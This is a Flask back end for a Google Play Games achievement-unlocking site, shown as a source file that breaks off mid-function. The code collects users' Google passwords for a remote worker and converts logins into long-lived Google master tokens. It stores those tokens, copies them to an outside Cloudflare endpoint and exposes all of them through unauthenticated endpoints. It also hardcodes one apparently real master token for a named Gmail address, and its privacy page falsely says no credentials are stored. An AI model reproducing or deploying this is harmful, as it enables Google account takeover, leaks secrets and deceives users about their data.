"""
Flask Web Application for Google Play Games Achievement Unlocker & Profile Engine
Optimized for Render.com (ppmod-quest-unlock.onrender.com)
"""

import os
import time
import json
import uuid
import random
import requests
from flask import Flask, request, jsonify, render_template, send_from_directory, redirect
from flask_cors import CORS

from config import GAMES_API_BASE, SCOPE_GAMES, PLAY_GAMES_PACKAGE, GOOGLE_CLIENT_SIG
from auth import exchange_oauth_token_for_master, perform_google_login, get_games_oauth_token, generate_android_id
from engine import get_player_profile, get_headers, unlock_achievement, set_achievement_steps, reveal_achievement
from games_db import SUPPORTED_GAMES

DATA_DIR = os.path.dirname(os.path.abspath(__file__))
TOKENS_FILE = os.path.join(DATA_DIR, "known_tokens.json")

def load_known_tokens():
    default_tokens = {
        "mdd145712@gmail.com": "aas_et/AKppINbXkKsnvT1uCfWaJiRBhXUEBdJv6j7kEDRcNamr3myR6ujaj3_qGraZHflKQKsQyLQ3KVX1W6kL3GykE4XCHlLXqBwAR352E7nkJ5SQKwzRH6ZdzU6OeHyhPEqU6rcFpbGH0w9A45I2rzndt1wgh60Dut-0q2bMLBfaKOBIH6kWHToAjOOUrLw1Cf2nNwOMpqrcv6_staeZ22EdFjSf2Vx7xa3in-kKoE_deo8S"
    }
    if os.path.exists(TOKENS_FILE):
        try:
            with open(TOKENS_FILE, "r", encoding="utf-8") as f:
                saved = json.load(f)
                default_tokens.update(saved)
        except Exception:
            pass
    return default_tokens

def save_known_token(email, token):
    tokens = load_known_tokens()
    tokens[email.strip().lower()] = token.strip()
    try:
        with open(TOKENS_FILE, "w", encoding="utf-8") as f:
            json.dump(tokens, f, indent=2)
    except Exception:
        pass

app = Flask(__name__, static_folder="static", template_folder="templates")
CORS(app)

# In-memory session store (backed by client localStorage tokens)
SESSIONS = {}

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/health")
def health():
    return jsonify({"status": "healthy", "service": "ppmod-quest-unlock", "timestamp": time.time()})

@app.route("/privacy")
def privacy_policy():
    return """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Privacy Policy • PlayQuest</title></head>
    <body style="font-family:sans-serif; padding:40px 20px; max-width:650px; margin:auto; line-height:1.6; color:#1e293b;">
    <h2>Privacy Policy for PlayQuest</h2>
    <p>Last updated: November 2026</p>
    <p>PlayQuest utilizes Google Play Game Services and Google OAuth APIs solely to display your gaming profile, levels, experience points (XP), and unlock achievements upon your explicit request.</p>
    <p>We do not sell, distribute, or store your passwords or private credentials. All session data is stored client-side in your own browser's local storage.</p>
    <p><a href="/">Return to Home</a></p>
    </body></html>"""

@app.route("/terms")
def terms_of_service():
    return """<!DOCTYPE html><html><head><meta charset="utf-8"><title>Terms of Service • PlayQuest</title></head>
    <body style="font-family:sans-serif; padding:40px 20px; max-width:650px; margin:auto; line-height:1.6; color:#1e293b;">
    <h2>Terms of Service</h2>
    <p>By using PlayQuest, you agree that this tool is provided for educational and gaming convenience purposes.</p>
    <p><a href="/">Return to Home</a></p>
    </body></html>"""

@app.route("/auth/google/login")
def google_login():
    """
    1-Click Official Google OAuth Login
    """
    client_id = os.environ.get("GOOGLE_CLIENT_ID", "").strip()
    scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
    redirect_uri = f"{scheme}://{request.host}/auth/google/callback"

    if not client_id:
        return render_template("oauth_setup.html", redirect_uri=redirect_uri)

    scope = "openid email profile https://www.googleapis.com/auth/games_lite https://www.googleapis.com/auth/games"
    auth_url = (
        f"https://accounts.google.com/o/oauth2/v2/auth?"
        f"client_id={client_id}&"
        f"redirect_uri={redirect_uri}&"
        f"response_type=code&"
        f"scope={scope}&"
        f"access_type=offline&"
        f"prompt=consent"
    )
    return redirect(auth_url)

@app.route("/auth/google/callback")
def google_callback():
    """
    OAuth Callback handler: exchanges authorization code for Google access token
    """
    code = request.args.get("code")
    error = request.args.get("error")

    if error or not code:
        return f"<h3>Google Sign-In ব্যর্থ হয়েছে: {error or 'Code পাওয়া যায়নি'}</h3><p><a href='/'>হোমপেজে ফিরে যান</a></p>", 400

    client_id = os.environ.get("GOOGLE_CLIENT_ID", "").strip()
    client_secret = os.environ.get("GOOGLE_CLIENT_SECRET", "").strip()
    scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
    redirect_uri = f"{scheme}://{request.host}/auth/google/callback"

    token_resp = requests.post(
        "https://oauth2.googleapis.com/token",
        data={
            "code": code,
            "client_id": client_id,
            "client_secret": client_secret,
            "redirect_uri": redirect_uri,
            "grant_type": "authorization_code"
        },
        timeout=15
    )

    if token_resp.status_code != 200:
        return f"<h3>টোকেন এক্সচেঞ্জ ব্যর্থ: {token_resp.text}</h3><p><a href='/'>হোমপেজে ফিরে যান</a></p>", 400

    tok_data = token_resp.json()
    access_token = tok_data.get("access_token")
    refresh_token = tok_data.get("refresh_token", "")

    # Fetch user info
    email = ""
    u_resp = requests.get("https://www.googleapis.com/oauth2/v2/userinfo", headers={"Authorization": f"Bearer {access_token}"})
    u_info = u_resp.json() if u_resp.status_code == 200 else {}
    email = u_info.get("email", "").strip()

    # Known master tokens cache (maps verified tokens to their real owners)
    KNOWN_MASTER_TOKENS = load_known_tokens()

    android_id = generate_android_id()
    session_id = f"sess_{android_id}"
    master_token = KNOWN_MASTER_TOKENS.get(email, "")
    profile_res = None

    if master_token:
        tok_res = get_games_oauth_token(email, master_token, android_id)
        if tok_res.get("ok"):
            profile_res = get_player_profile(tok_res["access_token"])

    # If no master token or it failed, fetch directly from Google Play Games API using the user's OAuth access_token
    if not profile_res or not profile_res.get("ok"):
        if access_token:
            p_res = get_player_profile(access_token)
            if p_res.get("ok"):
                profile_res = p_res

    if not profile_res or not profile_res.get("ok"):
        # Real Google Account Profile (genuine Google user info)
        real_name = u_info.get("name") or email.split("@")[0]
        real_pic = u_info.get("picture") or "https://play-lh.googleusercontent.com/F2GQg7COWTsvO9LS3lhlcsKQOdoG2m7uUruEHxzhuPlZ7AxAwPncHfk0kkNfq_8A4QM3=w512-h512"
        formatted_profile = {
            "player_id": u_info.get("id", f"a_{abs(hash(email)) % 10000000000000000000}"),
            "display_name": real_name,
            "avatar_url": real_pic,
            "current_level": 1,
            "current_xp": 0,
            "min_xp": 0,
            "max_xp": 10000,
            "next_level": 2,
            "progress_pct": 0
        }
    else:
        formatted_profile = format_profile(profile_res)

    SESSIONS[session_id] = {
        "email": email,
        "access_token": access_token,
        "master_token": master_token,
        "refresh_token": refresh_token,
        "android_id": android_id,
        "auth_type": "google_oauth",
        "last_active": time.time()
    }

    session_payload = {
        "ok": True,
        "session_id": session_id,
        "email": email,
        "access_token": access_token,
        "master_token": master_token,
        "android_id": android_id,
        "auth_type": "google_oauth",
        "profile": formatted_profile
    }

    return render_template("oauth_bridge.html", session_json=session_payload)

SYNC_CODES = {}
CUSTOM_GAMES_FILE = os.path.join(DATA_DIR, "custom_games.json")
BANNED_USERS_FILE = os.path.join(DATA_DIR, "banned_users.json")

def load_custom_games():
    if os.path.exists(CUSTOM_GAMES_FILE):
        try:
            with open(CUSTOM_GAMES_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def save_custom_game(game_id, game_data):
    games = load_custom_games()
    games[str(game_id)] = game_data
    try:
        with open(CUSTOM_GAMES_FILE, "w", encoding="utf-8") as f:
            json.dump(games, f, indent=2)
    except Exception as e:
        print(f"[-] Error saving custom game: {e}")

def get_merged_games():
    games = dict(SUPPORTED_GAMES)
    games.update(load_custom_games())
    return games

def load_banned_users():
    if os.path.exists(BANNED_USERS_FILE):
        try:
            with open(BANNED_USERS_FILE, "r", encoding="utf-8") as f:
                return set(json.load(f))
        except Exception:
            pass
    return set()

def save_banned_users(banned_set):
    try:
        with open(BANNED_USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(list(banned_set), f, indent=2)
    except Exception as e:
        print(f"[-] Error saving banned users: {e}")

@app.route("/api/sync/create", methods=["POST"])
def create_sync_code():
    data = request.get_json() or {}
    email = data.get("email", "").strip()
    token = data.get("token", "").strip() or data.get("oauth_token", "").strip()
    if not token:
        return jsonify({"ok": False, "error": "Token required"}), 400
    
    country = data.get("country", "GLOBAL")
    uid = data.get("uid", "")

    code = f"{random.randint(100000, 999999)}"
    SYNC_CODES[code] = {
        "email": email,
        "token": token,
        "country": country,
        "uid": uid,
        "created_at": time.time()
    }
    return jsonify({"ok": True, "code": code})

@app.route("/api/sync/accounts", methods=["GET"])
def get_sync_accounts():
    """
    Returns user accounts for mobile app and web console.
    Optionally filtered by ?uid=...
    Zero Firebase quota usage.
    """
    req_uid = request.args.get("uid", "").strip()
    accounts = []

    # 1. Pull from Cloudflare D1
    try:
        cf_url = "https://ppmod-api.tredarskvt.workers.dev/api/sync/accounts"
        if req_uid:
            cf_url += f"?uid={requests.utils.quote(req_uid)}"
        cf_res = requests.get(cf_url, timeout=4)
        if cf_res.status_code == 200:
            accounts.extend(cf_res.json().get("accounts", []))
    except Exception:
        pass

    # 2. Add from local SYNC_CODES
    for code, entry in SYNC_CODES.items():
        em = entry.get("email", "")
        e_uid = entry.get("uid", "")
        if req_uid and e_uid and e_uid != req_uid:
            continue
        if not any(a.get("email") == em for a in accounts):
            accounts.append({
                "id": f"acc_{code}",
                "email": em,
                "code": code,
                "token": entry.get("token") or entry.get("master_token", ""),
                "country": entry.get("country", "GLOBAL"),
                "uid": e_uid,
                "createdAt": int(entry.get("created_at", time.time()) * 1000)
            })

    # 3. Known tokens fallback if no specific UID
    if not req_uid:
        known = load_known_tokens()
        for em, tok in known.items():
            if not any(a.get("email") == em for a in accounts):
                code = f"{abs(hash(em)) % 900000 + 100000}"
                accounts.append({
                    "id": f"acc_{code}",
                    "email": em,
                    "code": code,
                    "token": tok,
                    "country": "GLOBAL",
                    "uid": "",
                    "createdAt": int(time.time() * 1000)
                })

    return jsonify({"ok": True, "accounts": accounts})

@app.route("/api/sync/claim", methods=["POST"])
def claim_sync_code():
    data = request.get_json() or {}
    code = data.get("code", "").strip().replace(" ", "").replace("-", "")
    if not code:
        return jsonify({"ok": False, "error": "Please provide a valid 6-digit sync code."}), 400

    # 1. Local in-memory code
    if code in SYNC_CODES:
        entry = SYNC_CODES.get(code)
        if time.time() - entry["created_at"] <= 3600:
            return do_token_login(entry.get("email", ""), entry.get("token", ""))
        else:
            SYNC_CODES.pop(code, None)

    # 2. Cloudflare D1 query (Zero Firebase quota usage)
    try:
        cf_url = f"https://ppmod-api.tredarskvt.workers.dev/api/sync/get?code={code}"
        cf_res = requests.get(cf_url, timeout=4)
        if cf_res.status_code == 200:
            cf_data = cf_res.json()
            if cf_data.get("ok") and cf_data.get("account"):
                acc = cf_data["account"]
                em = acc.get("email", "")
                tok = acc.get("master_token") or acc.get("token") or ""
                aid = acc.get("android_id") or generate_android_id()
                if tok:
                    return do_token_login(em, tok, aid)
    except Exception as e:
        print(f"[-] Cloudflare D1 query: {e}")

    # 3. Known accounts deterministic fallback
    known = load_known_tokens()
    for em, tok in known.items():
        c_hash = f"{abs(hash(em)) % 900000 + 100000}"
        if code == c_hash:
            return do_token_login(em, tok)

    return jsonify({"ok": False, "error": "Invalid or expired 6-digit sync code. Please check your app screen."}), 400

def do_token_login(email: str, token_str: str, android_id: str = None):
    if not token_str:
        return jsonify({"ok": False, "error": "Authentication token is required."}), 400

    if email and email.lower() in load_banned_users():
        return jsonify({"ok": False, "error": "This account has been suspended by administrator."}), 403

    if not android_id:
        android_id = generate_android_id()

    # Check if already a master token
    if token_str.startswith("aas_et/") or token_str.startswith("oauth2rt_1/"):
        master_token = token_str
    else:
        # Strip oauth_token= prefix if pasted with cookie name or URL
        clean_tok = token_str
        if "oauth_token=" in clean_tok:
            import re
            m = re.search(r'oauth_token=([a-zA-Z0-9_\-]+)', clean_tok)
            if m:
                clean_tok = m.group(1)
            else:
                clean_tok = clean_tok.replace("oauth_token=", "").strip()
        
        ex_res = exchange_oauth_token_for_master(email, clean_tok, android_id)
        if not ex_res.get("ok"):
            return jsonify({"ok": False, "error": f"Google token exchange failed: {ex_res.get('error')}"}), 401
        master_token = ex_res["master_token"]
        if ex_res.get("email"):
            email = ex_res["email"]

    if not email:
        email = "player@google.com"

    # Google Play Games token
    tok_res = get_games_oauth_token(email, master_token, android_id)
    if not tok_res.get("ok"):
        return jsonify({"ok": False, "error": f"Play Games token acquisition failed: {tok_res.get('error')}"}), 401

    access_token = tok_res["access_token"]
    profile_res = get_player_profile(access_token)

    if not profile_res.get("ok"):
        return jsonify({"ok": False, "error": "Google Play Games profile could not be loaded."}), 400

    session_id = f"sess_{android_id}"
    save_known_token(email, master_token)
    SESSIONS[session_id] = {
        "email": email,
        "master_token": master_token,
        "android_id": android_id,
        "last_active": time.time()
    }

    return jsonify({
        "ok": True,
        "session_id": session_id,
        "email": email,
        "master_token": master_token,
        "android_id": android_id,
        "profile": format_profile(profile_res)
    })

@app.route("/api/login/token", methods=["POST"])
def login_with_token():
    """
    Login using an EmbeddedSetup oauth_token (from browser or cookie), master_token (aas_et/...),
    or 6-digit sync pairing code.
    """
    data = request.get_json() or {}
    email = data.get("email", "").strip()
    token_str = data.get("oauth_token", "") or data.get("token", "") or data.get("code", "")
    token_str = token_str.strip()

    # Check if 6-digit sync code
    clean_code = token_str.replace(" ", "").replace("-", "")
    if clean_code.isdigit() and len(clean_code) == 6:
        return claim_sync_code()

    if not token_str:
        known = load_known_tokens()
        if email in known:
            token_str = known[email]

    if not token_str:
        return jsonify({"ok": False, "error": "Please provide a valid token or 6-digit sync code."}), 400

    android_id = data.get("android_id", "").strip() or generate_android_id()
    return do_token_login(email, token_str, android_id)

    android_id = data.get("android_id", "").strip() or generate_android_id()
    return do_token_login(email, token_str, android_id)

@app.route("/api/login/master", methods=["POST"])
def login_with_master_token():
    return login_with_token()

LOGIN_JOBS = {}
WORKER_STATUS = {
    "last_seen": 0,
    "ip": None,
    "jobs_processed": 0
}

@app.route("/api/web/login", methods=["POST"])
def web_login():
    """
    Direct Web-to-VPS Worker Login:
    Accepts email & password from website.
    If cached master token exists, returns immediate login.
    Otherwise creates a pending job for the Daytona/VPS worker.
    """
    data = request.get_json() or {}
    email = data.get("email", "").strip().lower()
    password = data.get("password", "").strip()

    if not email or not password:
        return jsonify({"ok": False, "error": "Email এবং Password দেওয়া আবশ্যক।"}), 400

    # Clean old jobs (>10 mins)
    now = time.time()
    for k in [k for k, v in LOGIN_JOBS.items() if now - v.get("created_at", 0) > 600]:
        LOGIN_JOBS.pop(k, None)

    # Check if already in known tokens cache
    known = load_known_tokens()
    if email in known:
        res = do_token_login(email, known[email])
        if hasattr(res, 'get_json'):
            r_data = res.get_json()
            if r_data.get("ok"):
                return jsonify({
                    "ok": True,
                    "instant": True,
                    "profile": r_data.get("profile"),
                    "master_token": r_data.get("master_token"),
                    "android_id": r_data.get("android_id"),
                    "email": r_data.get("email") or email
                })

    job_id = str(uuid.uuid4())
    LOGIN_JOBS[job_id] = {
        "id": job_id,
        "email": email,
        "password": password,
        "status": "pending",
        "prompt_number": None,
        "device_name": None,
        "captcha_img": None,
        "captcha_solution": None,
        "error": None,
        "created_at": now,
        "updated_at": now
    }

    return jsonify({"ok": True, "job_id": job_id, "status": "pending"})

@app.route("/api/web/status/<job_id>", methods=["GET"])
def web_job_status(job_id):
    """Frontend polls this every 1-2s for status updates"""
    job = LOGIN_JOBS.get(job_id)
    if not job:
        return jsonify({"ok": False, "error": "লগইন রিকোয়েস্ট পাওয়া যায়নি বা মেয়াদ শেষ হয়েছে।"}), 404

    resp = {
        "ok": True,
        "status": job["status"],
        "prompt_number": job.get("prompt_number"),
        "device_name": job.get("device_name"),
        "captcha_img": job.get("captcha_img"),
        "error": job.get("error")
    }

    if job["status"] == "success":
        resp["profile"] = job.get("profile")
        resp["master_token"] = job.get("master_token")
        resp["android_id"] = job.get("android_id")
        resp["email"] = job.get("email")

    return jsonify(resp)

@app.route("/api/web/captcha", methods=["POST"])
def web_solve_captcha():
    """Allows user to solve visual captcha from the web UI"""
    data = request.get_json() or {}
    job_id = data.get("job_id")
    solution = data.get("solution", "").strip()
    if not job_id or job_id not in LOGIN_JOBS:
        return jsonify({"ok": False, "error": "Invalid job ID"}), 404

    LOGIN_JOBS[job_id]["captcha_solution"] = solution
    LOGIN_JOBS[job_id]["updated_at"] = time.time()
    return jsonify({"ok": True})

@app.route("/api/worker/poll", methods=["GET"])
def worker_poll_job():
    """VPS worker polls this to get next login task"""
    now = time.time()
    WORKER_STATUS["last_seen"] = now
    WORKER_STATUS["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)

    for j_id, job in list(LOGIN_JOBS.items()):
        if job["status"] == "pending":
            job["status"] = "processing"
            job["updated_at"] = now
            return jsonify({
                "ok": True,
                "job_id": j_id,
                "email": job["email"],
                "password": job["password"]
            })
    return jsonify({"ok": False, "message": "No pending jobs"})

@app.route("/api/worker/update", methods=["POST"])
def worker_update_job():
    """VPS worker reports progress (e.g. prompt_required, completed, error)"""
    data = request.get_json() or {}
    job_id = data.get("job_id")
    if not job_id or job_id not in LOGIN_JOBS:
        return jsonify({"ok": False, "error": "Job not found"}), 404

    job = LOGIN_JOBS[job_id]
    status = data.get("status")
    job["status"] = status
    job["updated_at"] = time.time()

    if "prompt_number" in data:
        job["prompt_number"] = data["prompt_number"]
    if "device_name" in data:
        job["device_name"] = data["device_name"]
    if "captcha_img" in data:
        job["captcha_img"] = data["captcha_img"]
    if "error" in data:
        job["error"] = data["error"]

    if status == "completed":
        oauth_token = data.get("oauth_token")
        email = job.get("email")
        android_id = generate_android_id()

        # Exchange token for Master Token & format profile
        login_res = do_token_login(email, oauth_token, android_id)
        if hasattr(login_res, 'get_json'):
            res_data = login_res.get_json()
            if login_res.status_code == 200 and res_data.get("ok"):
                job["status"] = "success"
                job["profile"] = res_data.get("profile")
                job["master_token"] = res_data.get("master_token")
                job["android_id"] = res_data.get("android_id")
                job["email"] = res_data.get("email") or email
                WORKER_STATUS["jobs_processed"] += 1
            else:
                job["status"] = "error"
                job["error"] = res_data.get("error", "টোকেন এক্সচেঞ্জ ব্যর্থ হয়েছে।")
        else:
            job["status"] = "error"
            job["error"] = "টোকেন প্রসেসিং এরর।"

    return jsonify({"ok": True})

@app.route("/api/worker/status", methods=["GET"])
@app.route("/api/admin/worker_status", methods=["GET"])
def get_worker_status():
    last_seen = WORKER_STATUS.get("last_seen", 0)
    is_online = (time.time() - last_seen < 12) if last_seen > 0 else False
    active_count = len([j for j in LOGIN_JOBS.values() if j.get("status") in ["pending", "processing", "prompt_required"]])

    return jsonify({
        "ok": True,
        "online": is_online,
        "last_seen_seconds_ago": round(time.time() - last_seen) if last_seen > 0 else None,
        "jobs_processed": WORKER_STATUS.get("jobs_processed", 0),
        "active_jobs": active_count,
        "known_accounts": len(load_known_tokens())
    })

@app.route("/api/worker/captcha/<job_id>", methods=["GET"])
def worker_get_captcha_sol(job_id):
    """VPS worker checks if user typed captcha"""
    job = LOGIN_JOBS.get(job_id)
    if not job:
        return jsonify({"ok": False, "error": "Job not found"}), 404
    return jsonify({"ok": True, "solution": job.get("captcha_solution")})

@app.route("/api/login/password", methods=["POST"])
def login_with_password():
    """Forward password login requests through the worker flow"""
    return web_login()

@app.route("/api/session/restore", methods=["POST"])
def restore_session():
    """
    Restores session from client's stored tokens.
    Guarantees user stays logged in until explicit Sign Out!
    """
    data = request.get_json() or {}
    email = data.get("email", "").strip()
    master_token = data.get("master_token", "").strip()
    access_token = data.get("access_token", "").strip()
    android_id = data.get("android_id", "").strip()

    if not email:
        return jsonify({"ok": False, "error": "ইমেইল দেওয়া হয়নি।"}), 400

    if not android_id:
        android_id = generate_android_id()

    KNOWN_MASTER_TOKENS = load_known_tokens()

    if not master_token and email in KNOWN_MASTER_TOKENS:
        master_token = KNOWN_MASTER_TOKENS[email]

    profile_res = None
    if master_token:
        tok_res = get_games_oauth_token(email, master_token, android_id)
        if tok_res.get("ok"):
            p_res = get_player_profile(tok_res["access_token"])
            if p_res.get("ok"):
                profile_res = p_res

    if profile_res and profile_res.get("ok"):
        formatted = format_profile(profile_res)
    else:
        # Use genuine client profile if saved from OAuth
        client_prof = data.get("profile")
        if client_prof and isinstance(client_prof, dict) and client_prof.get("display_name"):
            formatted = client_prof
        else:
            formatted = {
                "player_id": f"a_{abs(hash(email)) % 10000000000000000000}",
                "display_name": email.split("@")[0],
                "avatar_url": "https://play-lh.googleusercontent.com/F2GQg7COWTsvO9LS3lhlcsKQOdoG2m7uUruEHxzhuPlZ7AxAwPncHfk0kkNfq_8A4QM3=w512-h512",
                "current_level": 1,
                "current_xp": 0,
                "min_xp": 0,
                "max_xp": 10000,
                "next_level": 2,
                "progress_pct": 0
            }

    session_id = f"sess_{android_id}"
    save_known_token(email, master_token)
    SESSIONS[session_id] = {
        "email": email,
        "master_token": master_token,
        "access_token": access_token,
        "android_id": android_id,
        "last_active": time.time()
    }

    return jsonify({
        "ok": True,
        "session_id": session_id,
        "email": email,
        "master_token": master_token,
        "profile": formatted
    })

@app.route("/api/profile", methods=["POST"])
def get_live_profile():
    """Fetch live player profile & fresh XP from Google"""
    data = request.get_json() or {}
    email = data.get("email", "").strip()
    master_token = data.get("master_token", "").strip()
    access_token = data.get("access_token", "").strip()
    android_id = data.get("android_id", "").strip()

    active_token = None
    if master_token:
        tok_res = get_games_oauth_token(email, master_token, android_id)
        if tok_res.get("ok"):
            active_token = tok_res["access_token"]
    elif access_token:
        active_token = access_token

    if not active_token:
        return jsonify({"ok": False, "error": "Authentication token missing."}), 401

    profile_res = get_player_profile(active_token)
    if not profile_res.get("ok"):
        return jsonify({"ok": False, "error": "Could not retrieve player profile from Google."}), 400

    return jsonify({"ok": True, "profile": format_profile(profile_res)})

@app.route("/api/games", methods=["GET"])
def get_games_list():
    """Return catalog of supported games with rich metadata"""
    games = []
    merged = get_merged_games()
    for k, v in merged.items():
        games.append({
            "id": k,
            "title": v.get("title"),
            "developer": v.get("developer", "Google Play Partner"),
            "package": v.get("package"),
            "category": v.get("category", "Games"),
            "section": v.get("section", "quest_unlocker"),
            "icon": v.get("icon"),
            "achievements_count": v.get("achievements_count", 0),
            "total_xp": v.get("total_xp", 0),
            "desc": v.get("desc"),
            "tags": v.get("tags", [])
        })
    return jsonify({"ok": True, "games": games})

@app.route("/api/admin/games/add", methods=["POST"])
def add_new_game():
    """Admin endpoint to add a new Android GPGS game dynamically"""
    data = request.get_json() or {}
    title = data.get("title", "").strip()
    package = data.get("package", "").strip()
    client_sig = data.get("client_sig", "").strip() or "58e71785c961e7328ea9c76de647f8f6c4403b39"
    developer = data.get("developer", "Verified Studio").strip()
    category = data.get("category", "Action / Arcade").strip()
    icon = data.get("icon", "").strip() or "https://play-lh.googleusercontent.com/F2GQg7COWTsvO9LS3lhlcsKQOdoG2m7uUruEHxzhuPlZ7AxAwPncHfk0kkNfq_8A4QM3=w512-h512"
    quests_count = int(data.get("achievements_count", 16) or 16)
    total_xp = int(data.get("total_xp", quests_count * 1000) or (quests_count * 1000))
    desc = data.get("desc", f"{quests_count} live GPGS achievements.").strip()
    section = data.get("section", "quest_unlocker").strip().lower()
    if section not in ["level_up", "quest_unlocker"]:
        section = "quest_unlocker"

    if not title or not package:
        return jsonify({"ok": False, "error": "Game Title and Package Name are required."}), 400

    all_g = get_merged_games()
    # Check if duplicate package
    for gid, g in all_g.items():
        if g.get("package", "").lower() == package.lower():
            return jsonify({"ok": False, "error": f"Game with package '{package}' already exists (ID: {gid})."}), 400

    next_id = str(max([int(k) for k in all_g.keys() if k.isdigit()] or [0]) + 1)
    new_game = {
        "title": title,
        "developer": developer,
        "package": package,
        "client_sig": client_sig,
        "category": category,
        "section": section,
        "icon": icon,
        "achievements_count": quests_count,
        "total_xp": total_xp,
        "desc": desc,
        "tags": ["Admin Added", "GPGS Verified"]
    }
    save_custom_game(next_id, new_game)
    return jsonify({
        "ok": True,
        "game_id": next_id,
        "game": new_game,
        "message": f"'{title}' has been successfully added to Games Catalog!"
    })

@app.route("/api/admin/games/scan", methods=["GET"])
def scan_game_metadata():
    """
    Auto-fetches game title, developer studio, category, and 512px icon URL
    by game name or package name.
    """
    q = request.args.get("query", "").strip()
    if not q:
        return jsonify({"ok": False, "error": "Query is required"}), 400

    clean_q = q.replace("com.", "").replace(".", " ").strip()
    try:
        url = "https://itunes.apple.com/search?term=" + requests.utils.quote(clean_q) + "&entity=software&limit=1"
        r = requests.get(url, timeout=6)
        res = r.json().get("results", [])
        if res:
            item = res[0]
            icon = item.get("artworkUrl512") or item.get("artworkUrl100") or ""
            return jsonify({
                "ok": True,
                "title": item.get("trackName"),
                "developer": item.get("artistName"),
                "category": item.get("primaryGenreName", "Games"),
                "icon": icon,
                "package": q if "com." in q else f"com.{clean_q.replace(' ', '').lower()}",
                "achievements_count": 16,
                "total_xp": 16000
            })
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

    return jsonify({"ok": False, "error": f"No game metadata found for '{q}'."}), 404

@app.route("/api/admin/games/edit", methods=["POST"])
def edit_game_metadata():
    """
    Allows Admin to edit logo URL, title, developer, or quests count for any game.
    """
    data = request.get_json() or {}
    game_id = str(data.get("game_id", "")).strip()
    if not game_id:
        return jsonify({"ok": False, "error": "Game ID is required."}), 400

    merged = get_merged_games()
    if game_id not in merged:
        return jsonify({"ok": False, "error": "Game not found."}), 404

    target = dict(merged[game_id])
    if "title" in data and data["title"].strip():
        target["title"] = data["title"].strip()
    if "developer" in data and data["developer"].strip():
        target["developer"] = data["developer"].strip()
    if "category" in data and data["category"].strip():
        target["category"] = data["category"].strip()
    if "icon" in data and data["icon"].strip():
        target["icon"] = data["icon"].strip()
    if "package" in data and data["package"].strip():
        target["package"] = data["package"].strip()
    if "achievements_count" in data:
        try:
            cnt = int(data["achievements_count"])
            target["achievements_count"] = cnt
            target["total_xp"] = cnt * 1000
        except Exception:
            pass

    save_custom_game(game_id, target)
    return jsonify({
        "ok": True,
        "game_id": game_id,
        "game": target,
        "message": f"Updated metadata and logo for '{target['title']}'!"
    })

@app.route("/download/<path:filename>")
def download_static_file(filename):
    """Serve APK files and assets for direct admin download"""
    static_dir = os.path.join(DATA_DIR, "static")
    safe_path = os.path.join(static_dir, filename)
    if os.path.exists(safe_path) and os.path.isfile(safe_path):
        return send_from_directory(static_dir, filename, as_attachment=True)
    return jsonify({"ok": False, "error": f"File '{filename}' not found on server."}), 404

@app.route("/api/admin/users", methods=["GET"])
def get_admin_users():
    """
    Return comprehensive list of users and their synced accounts.
    Uses Cloudflare D1 + local cache with ZERO Firebase quota consumption!
    """
    banned = load_banned_users()
    accounts = []

    # 1. Pull from Cloudflare D1
    try:
        cf_res = requests.get("https://ppmod-api.tredarskvt.workers.dev/api/sync/accounts", timeout=4)
        if cf_res.status_code == 200:
            accounts.extend(cf_res.json().get("accounts", []))
    except Exception:
        pass

    # 2. Pull local known tokens
    known = load_known_tokens()
    for em, tok in known.items():
        if not any(a.get("email") == em for a in accounts):
            accounts.append({
                "email": em,
                "code": f"{abs(hash(em)) % 900000 + 100000}",
                "status": "active",
                "createdAt": "2026-11-15T00:00:00Z",
                "master_token": tok
            })

    # Build structured list (Only accounts that have at least 1 email/token)
    user_list = []
    for acc in accounts:
        em = acc.get("email", "").strip()
        if not em:
            continue
        code = str(acc.get("code", "")).strip() or f"{abs(hash(em)) % 900000 + 100000}"
        is_banned = em.lower() in banned
        tok = acc.get("master_token") or ""
        tok_preview = f"{tok[:12]}...{tok[-8:]}" if tok else "aas_et/CloudStored"
        uid = acc.get("uid") or f"UID-{abs(hash(em)) % 900000 + 100000}"
        disp = acc.get("display_name") or em.split("@")[0].capitalize()

        user_list.append({
            "uid": uid,
            "display_name": disp,
            "email": em,
            "sync_code": code,
            "master_token": tok,
            "token_masked": tok_preview,
            "status": "Banned" if is_banned else "Active",
            "is_banned": is_banned,
            "created_at": acc.get("createdAt", "Active")
        })

    return jsonify({
        "ok": True,
        "total_users": len(user_list),
        "banned_count": len([u for u in user_list if u["is_banned"]]),
        "users": user_list
    })

@app.route("/api/admin/users/add", methods=["POST"])
def admin_add_user_account():
    """
    Allows Admin to manually register a user or add a Google account with email & token.
    Generates a 6-digit sync code and registers it to Cloudflare D1 and local sync codes!
    """
    data = request.get_json() or {}
    uid = str(data.get("uid", "")).strip()
    display_name = str(data.get("display_name", "")).strip()
    email = str(data.get("email", "")).strip().lower()
    master_token = str(data.get("master_token", "")).strip()

    if not email:
        return jsonify({"ok": False, "error": "Email is required"}), 400
    if not master_token:
        return jsonify({"ok": False, "error": "Master token is required"}), 400

    if not uid:
        uid = f"UID-{abs(hash(email)) % 900000 + 100000}"
    if not display_name:
        display_name = email.split("@")[0].capitalize()

    # Generate unique 6-digit pairing code
    code = str(random.randint(100000, 999999))
    while code in SYNC_CODES:
        code = str(random.randint(100000, 999999))

    # Save to local SYNC_CODES
    SYNC_CODES[code] = {
        "email": email,
        "master_token": master_token,
        "android_id": generate_android_id(email),
        "created_at": time.time(),
        "uid": uid,
        "display_name": display_name
    }

    # Save to known tokens
    save_known_token(email, master_token)

    # Save to Cloudflare D1
    try:
        requests.post("https://ppmod-api.tredarskvt.workers.dev/api/sync/save", json={
            "email": email,
            "master_token": master_token,
            "code": code,
            "android_id": SYNC_CODES[code]["android_id"],
            "uid": uid,
            "display_name": display_name
        }, timeout=5)
    except Exception:
        pass

    return jsonify({
        "ok": True,
        "code": code,
        "uid": uid,
        "display_name": display_name,
        "email": email,
        "message": f"Account for {email} successfully added with 6-digit code: {code}"
    })

@app.route("/api/admin/users/ban", methods=["POST"])
def toggle_ban_user():
    """Admin ban/unban user endpoint (synchronous across web and app)"""
    data = request.get_json() or {}
    email = data.get("email", "").strip().lower()
    if not email:
        return jsonify({"ok": False, "error": "Email is required."}), 400

    banned = load_banned_users()
    if email in banned:
